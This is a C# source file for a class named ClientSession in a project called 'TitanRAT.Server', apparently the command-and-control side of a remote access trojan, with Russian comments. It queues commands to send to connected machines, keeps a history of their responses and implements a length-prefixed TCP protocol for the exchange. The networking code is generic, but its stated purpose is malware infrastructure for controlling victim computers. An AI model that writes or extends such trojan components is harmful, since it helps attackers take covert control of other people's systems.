using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Collections.Concurrent;

namespace TitanRAT.Server;

public class ClientSession
{
    public string Id { get; }
    public string Hostname { get; set; } = "Unknown";
    public DateTime LastSeen { get; set; } = DateTime.UtcNow;

    private readonly TcpClient _client;
    private readonly NetworkStream _stream;
    private readonly ConcurrentQueue<string> _commandQueue = new();
    private readonly ConcurrentQueue<string> _responseHistory = new();
    private const int MAX_HISTORY = 200;

    public ClientSession(string id, TcpClient client)
    {
        Id = id;
        _client = client;
        _client.ReceiveTimeout = 15000;
        _client.SendTimeout = 15000;
        _stream = client.GetStream();
    }

    //Добавление команды в очередь и извлечение
    public void EnqueueCommand(string command) => _commandQueue.Enqueue(command);
    public string? GetPendingCommand() => _commandQueue.TryDequeue(out var cmd) ? cmd : null;

    //Добавляет ответ в историю, обрезает до 200
    public void AddResponse(string response)
    {
        _responseHistory.Enqueue(response);
        while (_responseHistory.Count > MAX_HISTORY) _responseHistory.TryDequeue(out _);
    }

    // Получение последних N ответов, очистка очереди, размер очереди
    public IEnumerable<string> GetRecentResponses(int count = 20) => _responseHistory.Reverse().Take(count);
    public void ClearQueue() { while (_commandQueue.TryDequeue(out _)) { } }
    public int QueueSize => _commandQueue.Count;

    // Чтение строки до '\n' (текстовый протокол для рукопожатия)
    public async Task<string?> ReadLineAsync()
    {
        var buffer = new List<byte>();
        var singleByte = new byte[1];
        while (true)
        {
            int read = await _stream.ReadAsync(singleByte, 0, 1);
            if (read == 0) return null;
            if (singleByte[0] == '\n') break;
            buffer.Add(singleByte[0]);
        }
        return Encoding.UTF8.GetString(buffer.ToArray());
    }

    // Бинарное чтение (длина + данные)
    public async Task<byte[]?> ReadBinaryAsync()
    {
        var lenBytes = new byte[4];
        int read = await _stream.ReadAsync(lenBytes, 0, 4);
        if (read != 4) return null;
        int length = IPAddress.NetworkToHostOrder(BitConverter.ToInt32(lenBytes, 0));
        if (length <= 0 || length > 10 * 1024 * 1024) return null;
        var buffer = new byte[length];
        int total = 0;
        while (total < length)
        {
            int r = await _stream.ReadAsync(buffer, total, length - total);
            if (r == 0) return null;
            total += r;
        }
        return buffer;
    }

    public async Task SendBinaryAsync(byte[] data)
    {
        var lenBytes = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(data.Length));
        await _stream.WriteAsync(lenBytes, 0, 4);
        await _stream.WriteAsync(data, 0, data.Length);
    }

    public async Task SendCommandAsync(string command)
    {
        var bytes = Encoding.UTF8.GetBytes(command);
        await SendBinaryAsync(bytes);
    }

    public void Close()
    {
        try { _stream?.Dispose(); _client?.Close(); } catch { }
    }
}